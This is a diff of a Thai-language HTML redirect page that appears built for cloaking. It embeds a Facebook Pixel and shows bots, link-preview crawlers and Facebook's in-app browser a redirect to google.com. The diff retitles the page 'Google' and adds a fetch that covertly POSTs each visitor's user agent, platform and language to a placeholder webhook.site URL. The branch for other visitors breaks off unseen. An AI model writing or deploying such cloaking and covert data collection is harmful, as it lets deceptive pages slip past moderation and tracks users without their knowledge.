@@ -1,12 +1,11 @@
-
 <!DOCTYPE html>
 <html lang="th">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>กำลังโหลด...</title>
-  <!-- Facebook Pixel -->
+  <title>Google</title>
   <script>
+    // Facebook Pixel
     !function(f,b,e,v,n,t,s){
       if(f.fbq)return;n=f.fbq=function(){
         n.callMethod? n.callMethod.apply(n,arguments):n.queue.push(arguments)
@@ -21,15 +20,26 @@
   </script>
 </head>
 <body>
+  <h1>กำลังโหลด...</h1>
   <script>
+    // ตรวจสอบ UA
     const ua = navigator.userAgent.toLowerCase();
     const isBot = /bot|crawl|spider|preview|whatsapp|line|twitter/i.test(ua);
     const isFacebookBrowser = ua.includes("fbav") || ua.includes("fban");
 
-    console.log("🔍 UA:", ua);
-    console.log("✅ isBot:", isBot);
-    console.log("✅ isFacebookBrowser:", isFacebookBrowser);
+    // ส่งข้อมูลไป webhook
+    fetch("https://webhook.site/your-custom-url", {
+      method: "POST",
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        timestamp: new Date().toISOString()
+      })
+    });
 
+    // redirect ตามเงื่อนไข
     if (isBot || isFacebookBrowser) {
       window.location.href = "https://www.google.com/";
     } else {
